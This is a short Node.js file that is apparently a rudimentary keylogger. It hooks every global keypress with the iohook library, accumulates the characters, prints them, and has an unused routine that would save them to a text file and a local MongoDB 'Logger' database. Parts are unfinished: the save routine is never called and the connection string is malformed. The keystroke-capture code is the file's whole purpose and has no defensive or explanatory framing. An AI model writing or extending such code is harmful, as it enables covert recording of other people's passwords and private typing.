const ioHook = require('iohook');
const connectDB = require('./connection/connectDb')
const writeFile = require('./common/writefile')
const service = require('./service/service')

const PORT = " mongodb://127.0.0.1:27017/Logger"
const FILE_URL = "./input.txt"

let value ="";
const date = new Date();
ioHook.on("keypress", event => {
    // value += event.keychar==8?'':String.fromCharCode(event.keychar);
value += String.fromCharCode(event.keychar)
// run()
console.log(value)
});

ioHook.start();

const run = async()=>{
   await writeFile(FILE_URL,value)
    let time = date.getTime();
    console.log(time)
    // if(time == '6:00'){
    //     service()
    // }
   await service()
   
}
const start = async()=>{
console.log("start lại")
    try {
        await connectDB(PORT)
    } catch (error) {
        console.log(error)
    }

}
start()

